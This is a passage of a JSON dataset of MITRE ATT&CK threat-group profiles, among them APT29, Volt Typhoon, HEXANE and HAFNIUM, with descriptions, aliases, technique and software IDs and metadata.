      "description": "[Aoqin Dragon](https://attack.mitre.org/groups/G1007) is a suspected Chinese cyber espionage threat group that has been active since at least 2013. [Aoqin Dragon](https://attack.mitre.org/groups/G1007) has primarily targeted government, education, and telecommunication organizations in Australia, Cambodia, Hong Kong, Singapore, and Vietnam. Security researchers noted a potential association between [Aoqin Dragon](https://attack.mitre.org/groups/G1007) and UNC94, based on malware, infrastructure, and targets.(Citation: SentinelOne Aoqin Dragon June 2022)",
      "aliases": [
        "Aoqin Dragon"
      ],
      "techniques": [
        "T1204.002",
        "T1570",
        "T1091",
        "T1027.002",
        "T1587.001",
        "T1083",
        "T1036",
        "T1588.002",
        "T1203"
      ],
      "software": [
        "S1026",
        "S1027"
      ],
      "url": "https://attack.mitre.org/groups/G1007",
      "stix_id": "intrusion-set--64d5f96a-f121-4d19-89f6-6709f5c49faa",
      "created": "2022-07-14T14:32:47.582000+00:00",
      "modified": "2025-04-16T20:37:33.761000+00:00"
    },
    "G1021": {
      "id": "G1021",
      "name": "Cinnamon Tempest",
      "description": "[Cinnamon Tempest](https://attack.mitre.org/groups/G1021) is a China-based threat group that has been active since at least 2021 deploying multiple strains of ransomware based on the leaked [Babuk](https://attack.mitre.org/software/S0638) source code. [Cinnamon Tempest](https://attack.mitre.org/groups/G1021) does not operate their ransomware on an affiliate model or purchase access but appears to act independently in all stages of the attack lifecycle. Based on victimology, the short lifespan of each ransomware variant, and use of malware attributed to government-sponsored threat groups, [Cinnamon Tempest](https://attack.mitre.org/groups/G1021) may be motivated by intellectual property theft or cyberespionage rather than financial gain.(Citation: Microsoft Ransomware as a Service)(Citation: Microsoft Threat Actor Naming July 2023)(Citation: Trend Micro Cheerscrypt May 2022)(Citation: SecureWorks BRONZE STARLIGHT Ransomware Operations June 2022)",
      "aliases": [
        "Cinnamon Tempest",
        "DEV-0401",
        "Emperor Dragonfly",
        "BRONZE STARLIGHT"
      ],
      "techniques": [
        "T1047",
        "T1574.001",
        "T1105",
        "T1484.001",
        "T1567.002",
        "T1588.002",
        "T1078",
        "T1657",
        "T1090",
        "T1078.002",
        "T1190",
        "T1059.006",
        "T1140",
        "T1021.002",
        "T1572",
        "T1080",
        "T1543.003",
        "T1059.001",
        "T1059.003"
      ],
      "software": [
        "S0633",
        "S0357",
        "S1040",
        "S0664",
        "S0013",
        "S1096",
        "S0154",
        "S1097"
      ],
      "url": "https://attack.mitre.org/groups/G1021",
      "stix_id": "intrusion-set--8b1e16f6-e7c8-4b7a-a5df-f81232c13e2f",
      "created": "2023-12-06T19:53:04.988000+00:00",
      "modified": "2024-04-04T23:27:22.311000+00:00"
    },
    "G1001": {
      "id": "G1001",
      "name": "HEXANE",
      "description": "[HEXANE](https://attack.mitre.org/groups/G1001) is a cyber espionage threat group that has targeted oil & gas, telecommunications, aviation, and internet service provider organizations since at least 2017. Targeted companies have been located in the Middle East and Africa, including Israel, Saudi Arabia, Kuwait, Morocco, and Tunisia. [HEXANE](https://attack.mitre.org/groups/G1001)'s TTPs appear similar to [APT33](https://attack.mitre.org/groups/G0064) and [OilRig](https://attack.mitre.org/groups/G0049) but due to differences in victims and tools it is tracked as a separate entity.(Citation: Dragos Hexane)(Citation: Kaspersky Lyceum October 2021)(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021)",
      "aliases": [
        "HEXANE",
        "Lyceum",
        "Siamesekitten",
        "Spirlin"
      ],
      "techniques": [
        "T1016",
        "T1555",
        "T1027.010",
        "T1589",
        "T1082",
        "T1583.001",
        "T1110",
        "T1053.005",
        "T1204.002",
        "T1567.002",
        "T1585.001",
        "T1016.001",
        "T1546.003",
        "T1069.001",
        "T1018",
        "T1021.001",
        "T1586.002",
        "T1110.003",
        "T1102.002",
        "T1588.002",
        "T1555.003",
        "T1059.001",
        "T1608.001",
        "T1589.002",
        "T1585.002",
        "T1033",
        "T1105",
        "T1049",
        "T1057",
        "T1056.001",
        "T1518",
        "T1059.005",
        "T1010",
        "T1591.004",
        "T1583.002",
        "T1534",
        "T1486",
        "T1561.002",
        "T1041",
        "T1046",
        "T1098.002",
        "T1134.001",
        "T1078.001",
        "T1114.002",
        "T1190",
        "T1021.001",
        "T1588.003",
        "T1003.001",
        "T1562.001",
        "T1059.003",
        "T1036.005",
        "T1505.003",
        "T1021.002",
        "T1570",
        "T1047",
        "T1562.002",
        "T1059.001",
        "T1105",
        "T1087.003",
        "T1588.002",
        "T1078"
      ],
      "software": [
        "S0097",
        "S0104",
        "S0190",
        "S0363",
        "S0100",
        "S0002",
        "S0378",
        "S1015",
        "S1019",
        "S1021",
        "S1014",
        "S1020",
        "S0357",
        "S0002",
        "S0095",
        "S0364",
        "S1149",
        "S1151",
        "S1150"
      ],
      "url": "https://attack.mitre.org/groups/G1001",
      "stix_id": "intrusion-set--f29b7c5e-2439-42ad-a86f-9f8984fafae3",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-08-14T15:24:19.141000+00:00"
    },
    "G0012": {
      "id": "G0012",
      "name": "Darkhotel",
      "description": "[Darkhotel](https://attack.mitre.org/groups/G0012) is a suspected South Korean threat group that has targeted victims primarily in East Asia since at least 2004. The group's name is based on cyber espionage operations conducted via hotel Internet networks against traveling executives and other select guests. [Darkhotel](https://attack.mitre.org/groups/G0012) has also conducted spearphishing campaigns and infected victims through peer-to-peer and file sharing networks.(Citation: Kaspersky Darkhotel)(Citation: Securelist Darkhotel Aug 2015)(Citation: Microsoft Digital Defense FY20 Sept 2020)",
      "aliases": [
        "Darkhotel",
        "DUBNIUM",
        "Zigzag Hail"
      ],
      "techniques": [
        "T1518.001",
        "T1497.002",
        "T1027.013",
        "T1573.001",
        "T1080",
        "T1082",
        "T1056.001",
        "T1566.001",
        "T1057",
        "T1140",
        "T1189",
        "T1091",
        "T1497",
        "T1497.001",
        "T1124",
        "T1553.002",
        "T1016",
        "T1083",
        "T1059.003",
        "T1036.005",
        "T1105",
        "T1547.001",
        "T1203",
        "T1204.002"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0012",
      "stix_id": "intrusion-set--9e729a7e-0dd6-4097-95bf-db8d64911383",
      "created": "2017-05-31T21:31:50.624000+00:00",
      "modified": "2024-01-08T20:27:56.707000+00:00"
    },
    "G0004": {
      "id": "G0004",
      "name": "Ke3chang",
      "description": "[Ke3chang](https://attack.mitre.org/groups/G0004) is a threat group attributed to actors operating out of China. [Ke3chang](https://attack.mitre.org/groups/G0004) has targeted oil, government, diplomatic, military, and NGOs in Central and South America, the Caribbean, Europe, and North America since at least 2010.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC Group APT15 Alive and Strong)(Citation: APT15 Intezer June 2018)(Citation: Microsoft NICKEL December 2021)",
      "aliases": [
        "Ke3chang",
        "APT15",
        "Mirage",
        "Vixen Panda",
        "GREF",
        "Playful Dragon",
        "RoyalAPT",
        "NICKEL",
        "Nylon Typhoon"
      ],
      "techniques": [
        "T1114.002",
        "T1105",
        "T1087.001",
        "T1033",
        "T1614.001",
        "T1087.002",
        "T1140",
        "T1558.001",
        "T1021.002",
        "T1041",
        "T1119",
        "T1083",
        "T1133",
        "T1018",
        "T1003.002",
        "T1016",
        "T1588.002",
        "T1020",
        "T1007",
        "T1543.003",
        "T1190",
        "T1036.005",
        "T1569.002",
        "T1005",
        "T1071.004",
        "T1213.002",
        "T1027",
        "T1059",
        "T1036.002",
        "T1560",
        "T1069.002",
        "T1560.001",
        "T1003.003",
        "T1057",
        "T1003.001",
        "T1587.001",
        "T1071.001",
        "T1059.003",
        "T1078",
        "T1583.005",
        "T1547.001",
        "T1049",
        "T1056.001",
        "T1003.004",
        "T1078.004",
        "T1082",
        "T1090.003",
        "T1190",
        "T1583.003",
        "T1588.002"
      ],
      "software": [
        "S0097",
        "S0096",
        "S0104",
        "S0227",
        "S0002",
        "S0057",
        "S0039",
        "S0100",
        "S0439",
        "S0280",
        "S0691"
      ],
      "url": "https://attack.mitre.org/groups/G0004",
      "stix_id": "intrusion-set--6713ab67-e25b-49cc-808d-2b36d4fbc35c",
      "created": "2017-05-31T21:31:47.177000+00:00",
      "modified": "2025-04-04T17:08:55.617000+00:00"
    },
    "G1017": {
      "id": "G1017",
      "name": "Volt Typhoon",
      "description": "[Volt Typhoon](https://attack.mitre.org/groups/G1017) is a People's Republic of China (PRC) state-sponsored actor that has been active since at least 2021 primarily targeting critical infrastructure organizations in the US and its territories including Guam. [Volt Typhoon](https://attack.mitre.org/groups/G1017)'s targeting and pattern of behavior have been assessed as pre-positioning to enable lateral movement to operational technology (OT) assets for potential destructive or disruptive attacks. [Volt Typhoon](https://attack.mitre.org/groups/G1017) has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands on keyboard activities, and stolen credentials.(Citation: CISA AA24-038A PRC Critical Infrastructure February 2024)(Citation: Microsoft Volt Typhoon May 2023)(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023)(Citation: Secureworks BRONZE SILHOUETTE May 2023)",
      "aliases": [
        "Volt Typhoon",
        "BRONZE SILHOUETTE",
        "Vanguard Panda",
        "DEV-0391",
        "UNC3236",
        "Voltzite",
        "Insidious Taurus"
      ],
      "techniques": [
        "T1046",
        "T1083",
        "T1591.004",
        "T1057",
        "T1021.001",
        "T1584.004",
        "T1090",
        "T1518",
        "T1078",
        "T1584.008",
        "T1056.001",
        "T1036.005",
        "T1036.008",
        "T1059.003",
        "T1190",
        "T1555",
        "T1074",
        "T1070.001",
        "T1590",
        "T1560.001",
        "T1124",
        "T1069.002",
        "T1016",
        "T1018",
        "T1047",
        "T1133",
        "T1140",
        "T1570",
        "T1593",
        "T1082",
        "T1589.002",
        "T1497.001",
        "T1003.003",
        "T1027.002",
        "T1573.001",
        "T1003.001",
        "T1584.005",
        "T1592",
        "T1049",
        "T1087.001",
        "T1217",
        "T1059.001",
        "T1654",
        "T1068",
        "T1113",
        "T1090.001",
        "T1587.004",
        "T1090.003",
        "T1594",
        "T1033",
        "T1112",
        "T1505.003",
        "T1218",
        "T1059.004",
        "T1007",
        "T1069",
        "T1584.003",
        "T1555.003",
        "T1591",
        "T1590.004",
        "T1010",
        "T1069.001",
        "T1120",
        "T1070.004",
        "T1588.006",
        "T1105",
        "T1552",
        "T1078.002",
        "T1005",
        "T1006",
        "T1012",
        "T1589",
        "T1588.002",
        "T1596.005",
        "T1087.002",
        "T1614",
        "T1070.007",
        "T1016.001",
        "T1552.004",
        "T1074.001",
        "T1590.006",
        "T1190",
        "T1573.002",
        "T1584.008",
        "T1056",
        "T1071.001",
        "T1587.001",
        "T1095",
        "T1505.003",
        "T1562.001",
        "T1016",
        "T1057",
        "T1584.008",
        "T1105",
        "T1583.003",
        "T1055.009",
        "T1095",
        "T1059.004",
        "T1222.002",
        "T1036.004",
        "T1070.004",
        "T1573",
        "T1036",
        "T1564.013",
        "T1546",
        "T1571",
        "T1083",
        "T1082",
        "T1518.001"
      ],
      "software": [
        "S0108",
        "S0029",
        "S0100",
        "S0645",
        "S0057",
        "S0002",
        "S0097",
        "S0357",
        "S0096",
        "S0104",
        "S0359",
        "S0160",
        "S0075",
        "S1144",
        "S0106",
        "S0039",
        "S1154",
        "S1154"
      ],
      "url": "https://attack.mitre.org/groups/G1017",
      "stix_id": "intrusion-set--174279b4-399f-4ddb-966e-5efedd1dd5f2",
      "created": "2023-07-27T20:35:46.206000+00:00",
      "modified": "2025-04-30T13:27:45.018000+00:00"
    },
    "G0077": {
      "id": "G0077",
      "name": "Leafminer",
      "description": "[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)",
      "aliases": [
        "Leafminer",
        "Raspite"
      ],
      "techniques": [
        "T1027.010",
        "T1588.002",
        "T1003.001",
        "T1555",
        "T1046",
        "T1003.005",
        "T1555.003",
        "T1552.001",
        "T1003.004",
        "T1055.013",
        "T1189",
        "T1018",
        "T1110.003",
        "T1136.001",
        "T1059.007",
        "T1114.002",
        "T1083"
      ],
      "software": [
        "S0349",
        "S0002",
        "S0413",
        "S0029"
      ],
      "url": "https://attack.mitre.org/groups/G0077",
      "stix_id": "intrusion-set--32bca8ff-d900-4877-aa65-d70baa041b74",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-16T20:37:33.912000+00:00"
    },
    "G0059": {
      "id": "G0059",
      "name": "Magic Hound",
      "description": "[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group that conducts long term, resource-intensive cyber espionage operations, likely on behalf of the Islamic Revolutionary Guard Corps. They have targeted European, U.S., and Middle Eastern government and military personnel, academics, journalists, and organizations such as the World Health Organization (WHO), via complex social engineering campaigns since at least 2014.(Citation: FireEye APT35 2018)(Citation: ClearSky Kittens Back 3 August 2020)(Citation: Certfa Charming Kitten January 2021)(Citation: Secureworks COBALT ILLUSION Threat Profile)(Citation: Proofpoint TA453 July2021)",
      "aliases": [
        "Magic Hound",
        "TA453",
        "COBALT ILLUSION",
        "Charming Kitten",
        "ITG18",
        "Phosphorus",
        "Newscaster",
        "APT35",
        "Mint Sandstorm"
      ],
      "techniques": [
        "T1056.001",
        "T1567",
        "T1589.001",
        "T1547.001",
        "T1059.001",
        "T1016.002",
        "T1588.002",
        "T1584.001",
        "T1059.003",
        "T1572",
        "T1585.002",
        "T1591.001",
        "T1071",
        "T1071.001",
        "T1486",
        "T1016.001",
        "T1586.002",
        "T1053.005",
        "T1592.002",
        "T1021.001",
        "T1087.003",
        "T1105",
        "T1190",
        "T1204.002",
        "T1218.011",
        "T1027.010",
        "T1046",
        "T1590.005",
        "T1113",
        "T1573",
        "T1059.005",
        "T1595.002",
        "T1036.010",
        "T1589.002",
        "T1204.001",
        "T1102.002",
        "T1033",
        "T1098.002",
        "T1070.004",
        "T1027.013",
        "T1566.002",
        "T1078.001",
        "T1083",
        "T1016",
        "T1036.005",
        "T1098.007",
        "T1598.003",
        "T1562.002",
        "T1562.001",
        "T1049",
        "T1114",
        "T1003.001",
        "T1570",
        "T1136.001",
        "T1057",
        "T1562.004",
        "T1114.002",
        "T1571",
        "T1070.003",
        "T1082",
        "T1114.001",
        "T1505.003",
        "T1090",
        "T1036.004",
        "T1583.001",
        "T1018",
        "T1112",
        "T1482",
        "T1589",
        "T1078.002",
        "T1566.003",
        "T1560.001",
        "T1585.001",
        "T1564.003",
        "T1562",
        "T1005",
        "T1047",
        "T1583.006",
        "T1189"
      ],
      "software": [
        "S0039",
        "S0357",
        "S0097",
        "S1144",
        "S0002",
        "S0096",
        "S0100",
        "S0108",
        "S0192",
        "S0029",
        "S0674",
        "S1012",
        "S0186"
      ],
      "url": "https://attack.mitre.org/groups/G0059",
      "stix_id": "intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2024-11-17T16:17:26.385000+00:00"
    },
    "G0016": {
      "id": "G0016",
      "name": "APT29",
      "description": "[APT29](https://attack.mitre.org/groups/G0016) is threat group that has been attributed to Russia's Foreign Intelligence Service (SVR).(Citation: White House Imposing Costs RU Gov April 2021)(Citation: UK Gov Malign RIS Activity April 2021) They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. [APT29](https://attack.mitre.org/groups/G0016) reportedly compromised the Democratic National Committee starting in the summer of 2015.(Citation: F-Secure The Dukes)(Citation: GRIZZLY STEPPE JAR)(Citation: Crowdstrike DNC June 2016)(Citation: UK Gov UK Exposes Russia SolarWinds April 2021)\n\nIn April 2021, the US and UK governments attributed the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) to the SVR; public statements included citations to [APT29](https://attack.mitre.org/groups/G0016), Cozy Bear, and The Dukes.(Citation: NSA Joint Advisory SVR SolarWinds April 2021)(Citation: UK NSCS Russia SolarWinds April 2021) Industry reporting also referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM Mar 2021)(Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: Volexity SolarWinds)(Citation: Cybersecurity Advisory SVR TTP May 2021)(Citation: Unit 42 SolarStorm December 2020)",
      "aliases": [
        "APT29",
        "IRON RITUAL",
        "IRON HEMLOCK",
        "NobleBaron",
        "Dark Halo",
        "NOBELIUM",
        "UNC2452",
        "YTTRIUM",
        "The Dukes",
        "Cozy Bear",
        "CozyDuke",
        "SolarStorm",
        "Blue Kitsune",
        "UNC3524",
        "Midnight Blizzard"
      ],
      "techniques": [
        "T1621",
        "T1003.002",
        "T1588.002",
        "T1090.004",
        "T1528",
        "T1568",
        "T1068",
        "T1546.003",
        "T1547.001",
        "T1136.003",
        "T1098.005",
        "T1587.003",
        "T1005",
        "T1105",
        "T1651",
        "T1566.001",
        "T1078.004",
        "T1053.005",
        "T1016.001",
        "T1587.001",
        "T1583.006",
        "T1090.003",
        "T1037",
        "T1027.006",
        "T1070.004",
        "T1203",
        "T1550.003",
        "T1204.001",
        "T1036.005",
        "T1110.003",
        "T1114.002",
        "T1027.001",
        "T1556.007",
        "T1059.001",
        "T1133",
        "T1037.004",
        "T1021.007",
        "T1595.002",
        "T1566.002",
        "T1070.006",
        "T1586.003",
        "T1090.002",
        "T1573",
        "T1047",
        "T1110.001",
        "T1199",
        "T1566.003",
        "T1078",
        "T1505.003",
        "T1059.006",
        "T1665",
        "T1218.005",
        "T1003.004",
        "T1190",
        "T1553.005",
        "T1649",
        "T1087.004",
        "T1098.002",
        "T1078.003",
        "T1546.008",
        "T1059.009",
        "T1586.002",
        "T1562.008",
        "T1204.002",
        "T1548.002",
        "T1027.002",
        "T1606.002",
        "T1078.004",
        "T1053.005",
        "T1087.002",
        "T1090.001",
        "T1114.002",
        "T1069.002",
        "T1057",
        "T1584.001",
        "T1016.001",
        "T1550",
        "T1555.003",
        "T1078.002",
        "T1036.005",
        "T1665",
        "T1098.002",
        "T1021.001",
        "T1562.001",
        "T1213",
        "T1021.002",
        "T1059.005",
        "T1568",
        "T1589.001",
        "T1552.004",
        "T1587.001",
        "T1140",
        "T1005",
        "T1083",
        "T1069",
        "T1018",
        "T1021.006",
        "T1550.001",
        "T1098.003",
        "T1553.002",
        "T1218.011",
        "T1546.003",
        "T1190",
        "T1213.003",
        "T1059.001",
        "T1070.004",
        "T1539",
        "T1606.001",
        "T1550.004",
        "T1074.002",
        "T1098.005",
        "T1133",
        "T1199",
        "T1059.003",
        "T1070.006",
        "T1558.003",
        "T1082",
        "T1105",
        "T1078.003",
        "T1070",
        "T1003.006",
        "T1562.002",
        "T1036.004",
        "T1098.001",
        "T1482",
        "T1555",
        "T1047",
        "T1195.002",
        "T1070.008",
        "T1484.002",
        "T1583.001",
        "T1087",
        "T1078",
        "T1560.001",
        "T1562.004",
        "T1048.002",
        "T1071.001",
        "T1078.002",
        "T1102.002",
        "T1001.002",
        "T1583.001",
        "T1587.001",
        "T1546.003",
        "T1585.001",
        "T1027.003"
      ],
      "software": [
        "S0684",
        "S0002",
        "S0175",
        "S0057",
        "S0521",
        "S0195",
        "S0677",
        "S0552",
        "S0029",
        "S0183",
        "S0096",
        "S0100",
        "S0357",
        "S0039",
        "S0633",
        "S0048",
        "S0515",
        "S0046",
        "S0682",
        "S0052",
        "S0512",
        "S0150",
        "S0634",
        "S0516",
        "S0049",
        "S1187",
        "S0588",
        "S0661",
        "S0518",
        "S0051",
        "S0560",
        "S0053",
        "S0589",
        "S0565",
        "S0511",
        "S0054",
        "S0597",
        "S0637",
        "S0562",
        "S0154",
        "S0139",
        "S1084",
        "S0037",
        "S0635",
        "S0050",
        "S0559",
        "S0514",
        "S0636",
        "S0513",
        "S0002",
        "S0552",
        "S0588",
        "S0560",
        "S0589",
        "S0597",
        "S0682",
        "S0562",
        "S0154",
        "S0559",
        "S0565",
        "S0029",
        "S0512",
        "S0051",
        "S0511",
        "S0518"
      ],
      "url": "https://attack.mitre.org/groups/G0016",
      "stix_id": "intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542",
      "created": "2017-05-31T21:31:52.748000+00:00",
      "modified": "2025-04-04T17:07:43.344000+00:00"
    },
    "G1011": {
      "id": "G1011",
      "name": "EXOTIC LILY",
      "description": "[EXOTIC LILY](https://attack.mitre.org/groups/G1011) is a financially motivated group that has been closely linked with [Wizard Spider](https://attack.mitre.org/groups/G0102) and the deployment of ransomware including [Conti](https://attack.mitre.org/software/S0575) and [Diavol](https://attack.mitre.org/software/S0659). [EXOTIC LILY](https://attack.mitre.org/groups/G1011) may be acting as an initial access broker for other malicious actors, and has targeted a wide range of industries including IT, cybersecurity, and healthcare since at least September 2021.(Citation: Google EXOTIC LILY March 2022)",
      "aliases": [
        "EXOTIC LILY"
      ],
      "techniques": [
        "T1566.003",
        "T1585.001",
        "T1566.001",
        "T1203",
        "T1566.002",
        "T1204.002",
        "T1585.002",
        "T1102",
        "T1594",
        "T1204.001",
        "T1597",
        "T1583.001",
        "T1593.001",
        "T1589.002",
        "T1608.001"
      ],
      "software": [
        "S0534",
        "S1039"
      ],
      "url": "https://attack.mitre.org/groups/G1011",
      "stix_id": "intrusion-set--129f2f77-1ab2-4c35-bd5e-21260cee92af",
      "created": "2022-08-18T15:25:59.689000+00:00",
      "modified": "2025-04-16T20:37:34.060000+00:00"
    },
    "G0080": {
      "id": "G0080",
      "name": "Cobalt Group",
      "description": "[Cobalt Group](https://attack.mitre.org/groups/G0080) is a financially motivated threat group that has primarily targeted financial institutions since at least 2016. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems. [Cobalt Group](https://attack.mitre.org/groups/G0080) has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims.(Citation: Talos Cobalt Group July 2018)(Citation: PTSecurity Cobalt Group Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: Group IB Cobalt Aug 2017)(Citation: Proofpoint Cobalt June 2017)(Citation: RiskIQ Cobalt Nov 2017)(Citation: RiskIQ Cobalt Jan 2018) Reporting indicates there may be links between [Cobalt Group](https://attack.mitre.org/groups/G0080) and both the malware [Carbanak](https://attack.mitre.org/software/S0030) and the group [Carbanak](https://attack.mitre.org/groups/G0008).(Citation: Europol Cobalt Mar 2018)",
      "aliases": [
        "Cobalt Group",
        "GOLD KINGSWOOD",
        "Cobalt Gang",
        "Cobalt Spider"
      ],
      "techniques": [
        "T1566.001",
        "T1105",
        "T1027.010",
        "T1053.005",
        "T1218.008",
        "T1195.002",
        "T1518.001",
        "T1559.002",
        "T1204.002",
        "T1068",
        "T1218.003",
        "T1218.010",
        "T1055",
        "T1059.001",
        "T1588.002",
        "T1021.001",
        "T1059.005",
        "T1203",
        "T1070.004",
        "T1548.002",
        "T1220",
        "T1071.004",
        "T1059.007",
        "T1566.002",
        "T1204.001",
        "T1059.003",
        "T1071.001",
        "T1547.001",
        "T1572",
        "T1573.002",
        "T1543.003",
        "T1219",
        "T1046",
        "T1037.001"
      ],
      "software": [
        "S0002",
        "S0195",
        "S0029",
        "S0284",
        "S0646",
        "S0154"
      ],
      "url": "https://attack.mitre.org/groups/G0080",
      "stix_id": "intrusion-set--dc6fe6ee-04c2-49be-ba3d-f38d2463c02a",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-16T20:37:34.214000+00:00"
    },
    "G0138": {
      "id": "G0138",
      "name": "Andariel",
      "description": "[Andariel](https://attack.mitre.org/groups/G0138) is a North Korean state-sponsored threat group that has been active since at least 2009. [Andariel](https://attack.mitre.org/groups/G0138) has primarily focused its operations--which have included destructive attacks--against South Korean government agencies, military organizations, and a variety of domestic companies; they have also conducted cyber financial operations against ATMs, banks, and cryptocurrency exchanges. [Andariel](https://attack.mitre.org/groups/G0138)'s notable activity includes Operation Black Mine, Operation GoldenAxe, and Campaign Rifle.(Citation: FSI Andariel Campaign Rifle July 2017)(Citation: IssueMakersLab Andariel GoldenAxe May 2017)(Citation: AhnLab Andariel Subgroup of Lazarus June 2018)(Citation: TrendMicro New Andariel Tactics July 2018)(Citation: CrowdStrike Silent Chollima Adversary September 2021)\n\n[Andariel](https://attack.mitre.org/groups/G0138) is considered a sub-set of [Lazarus Group](https://attack.mitre.org/groups/G0032), and has been attributed to North Korea's Reconnaissance General Bureau.(Citation: Treasury North Korean Cyber Groups September 2019)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.",
      "aliases": [
        "Andariel",
        "Silent Chollima",
        "PLUTONIUM",
        "Onyx Sleet"
      ],
      "techniques": [
        "T1049",
        "T1203",
        "T1005",
        "T1590.005",
        "T1189",
        "T1057",
        "T1592.002",
        "T1588.001",
        "T1204.002",
        "T1566.001",
        "T1027.003",
        "T1105"
      ],
      "software": [
        "S0433",
        "S0032"
      ],
      "url": "https://attack.mitre.org/groups/G0138",
      "stix_id": "intrusion-set--39d6890e-7f23-4474-b8ef-e7b0343c5fc8",
      "created": "2021-09-29T15:10:19.236000+00:00",
      "modified": "2024-09-12T18:36:06.078000+00:00"
    },
    "G0125": {
      "id": "G0125",
      "name": "HAFNIUM",
      "description": "[HAFNIUM](https://attack.mitre.org/groups/G0125) is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. [HAFNIUM](https://attack.mitre.org/groups/G0125) primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs. [HAFNIUM](https://attack.mitre.org/groups/G0125) has targeted remote management tools and cloud software for intial access and has demonstrated an ability to quickly operationalize exploits for identified vulnerabilities in edge devices.(Citation: Microsoft HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021)(Citation: Microsoft Silk Typhoon MAR 2025)",
      "aliases": [
        "HAFNIUM",
        "Operation Exchange Marauder",
        "Silk Typhoon"
      ],
      "techniques": [
        "T1592.004",
        "T1110.003",
        "T1105",
        "T1583.006",
        "T1560.001",
        "T1005",
        "T1583.005",
        "T1033",
        "T1213.002",
        "T1068",
        "T1584.005",
        "T1059.003",
        "T1057",
        "T1003.001",
        "T1530",
        "T1119",
        "T1590",
        "T1505.003",
        "T1589.002",
        "T1555.006",
        "T1593.003",
        "T1567.002",
        "T1114.002",
        "T1218.011",
        "T1078.003",
        "T1059.001",
        "T1070.001",
        "T1564.001",
        "T1016.001",
        "T1016",
        "T1590.005",
        "T1199",
        "T1078.004",
        "T1083",
        "T1003.003",
        "T1098",
        "T1136.002",
        "T1071.001",
        "T1018",
        "T1550.001",
        "T1190",
        "T1095",
        "T1132.001",
        "T1583.003"
      ],
      "software": [
        "S0357",
        "S0029",
        "S1155",
        "S1011",
        "S0073",
        "S0020"
      ],
      "url": "https://attack.mitre.org/groups/G0125",
      "stix_id": "intrusion-set--2688b13e-8e71-405a-9c40-0dee94bddf87",
      "created": "2021-03-03T19:40:47.280000+00:00",
      "modified": "2025-03-25T18:04:13.368000+00:00"
    },
    "G0087": {
      "id": "G0087",
      "name": "APT39",
      "description": "[APT39](https://attack.mitre.org/groups/G0087) is one of several names for cyber espionage activity conducted by the Iranian Ministry of Intelligence and Security (MOIS) through the front company Rana Intelligence Computing since at least 2014. [APT39](https://attack.mitre.org/groups/G0087) has primarily targeted the travel, hospitality, academic, and telecommunications industries in Iran and across Asia, Africa, Europe, and North America to track individuals and entities considered to be a threat by the MOIS.(Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)(Citation: FBI FLASH APT39 September 2020)(Citation: Dept. of Treasury Iran Sanctions September 2020)(Citation: DOJ Iran Indictments September 2020)",
      "aliases": [
        "APT39",
        "ITG07",
        "Chafer",
        "Remix Kitten"
      ],
      "techniques": [
        "T1046",
        "T1547.001",
        "T1090.002",
        "T1140",
        "T1056.001",
        "T1005",
        "T1059.001",
        "T1115",
        "T1003",
        "T1553.006",
        "T1546.010",
        "T1547.009",
        "T1135",
        "T1569.002",
        "T1027.013",
        "T1588.002",
        "T1021.001",
        "T1033",
        "T1027.002",
        "T1041",
        "T1204.002",
        "T1053.005",
        "T1070.004",
        "T1102.002",
        "T1560.001",
        "T1505.003",
        "T1105",
        "T1059.010",
        "T1204.001",
        "T1555",
        "T1113",
        "T1003.001",
        "T1018",
        "T1071.004",
        "T1059",
        "T1074.001",
        "T1083",
        "T1012",
        "T1110",
        "T1197",
        "T1136.001",
        "T1059.006",
        "T1036.005",
        "T1071.001",
        "T1090.001",
        "T1078",
        "T1056",
        "T1566.002",
        "T1566.001",
        "T1021.002",
        "T1190",
        "T1059.005",
        "T1021.004"
      ],
      "software": [
        "S0590",
        "S0488",
        "S0006",
        "S0002",
        "S0005",
        "S0029",
        "S0095",
        "S0459",
        "S0375",
        "S0454",
        "S0073"
      ],
      "url": "https://attack.mitre.org/groups/G0087",
      "stix_id": "intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80",
      "created": "2019-02-19T16:01:38.585000+00:00",
      "modified": "2024-04-11T02:59:52.392000+00:00"
    },
    "G0069": {
      "id": "G0069",
      "name": "MuddyWater",
